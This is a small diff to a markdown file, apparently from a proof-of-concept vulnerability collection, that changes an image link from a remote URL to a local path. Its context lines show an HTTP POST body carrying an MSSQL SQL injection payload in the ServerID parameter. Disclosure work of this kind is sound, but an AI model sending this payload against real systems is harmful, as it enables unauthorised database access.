@@ -20,4 +20,4 @@ Content-Length: 113
 
 operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','123456'))))%2b'1
 ```
-![c2758ffb9af884d3e9246f48e1c4191a](https://github.com/wy876/POC/assets/139549762/520a3274-ce88-43b9-89a7-fc20505017bb)
+![c2758ffb9af884d3e9246f48e1c4191a](../../images/520a3274-ce88-43b9-89a7-fc20505017bb.png)
